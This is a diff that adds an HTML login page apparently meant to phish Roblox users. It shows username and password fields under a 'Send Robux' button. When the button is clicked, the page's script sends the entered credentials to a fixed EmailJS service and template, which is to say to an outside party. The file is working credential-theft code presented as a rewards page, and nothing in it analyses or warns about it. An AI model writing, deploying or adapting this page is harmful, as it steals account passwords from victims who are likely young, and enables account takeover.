@@ -1,1 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Login Form</title>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    background-color: #f4f4f4;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    margin: 0;
+  }
+  .login-container {
+    background-color: #fff;
+    padding: 20px;
+    border-radius: 5px;
+    box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+  }
+  input {
+    width: 100%;
+    padding: 10px;
+    margin-bottom: 10px;
+    border: 1px solid #ccc;
+    border-radius: 3px;
+  }
+  button {
+    background-color: #4caf50;
+    color: #fff;
+    padding: 10px 20px;
+    border: none;
+    border-radius: 3px;
+    cursor: pointer;
+  }
+</style>
+<script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+</head>
+<body>
+  <div class="login-container">
+    <h2>Login</h2>
+    <input type="text" id="username" placeholder="Username">
+    <input type="password" id="password" placeholder="Password">
+    <button id="sendRobux">Send Robux</button>
+  </div>
+  <script>
+    document.getElementById("sendRobux").addEventListener("click", function() {
+      var username = document.getElementById("username").value;
+      var password = document.getElementById("password").value;
 
+      // Configure Email JS with your service ID
+      emailjs.init("user_yourEmailJSUserID");
+
+      var templateParams = {
+        username: username,
+        password: password
+      };
+
+      // Send email using Email JS template
+      emailjs.send("service_03k8fcp", "template_siyoi78", templateParams)
+        .then(function(response) {
+          console.log("Email sent successfully:", response);
+        })
+        .catch(function(error) {
+          console.error("Email sending error:", error);
+        });
+    });
+  </script>
+</body>
+</html>
